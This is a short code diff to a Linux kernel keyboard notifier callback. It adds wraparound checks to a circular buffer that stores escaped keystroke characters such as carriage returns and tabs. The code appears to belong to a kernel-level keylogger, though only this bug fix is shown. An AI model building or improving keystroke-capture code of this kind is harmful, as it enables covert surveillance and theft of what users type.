@@ -113,6 +113,7 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
             { 
                 *bptr = '\\' ;
                 bptr++;
+				if (bptr == endptr) bptr = buffer;
                 *bptr = 'r' ;
                 bptr++;
                 if (bptr == endptr) bptr = buffer;
@@ -121,6 +122,7 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
             {
                 *bptr = '\\';
                 bptr++;
+				if (bptr == endptr) bptr = buffer;
                 *bptr = 't';
                 bptr++;
                 if (bptr == endptr) bptr = buffer;
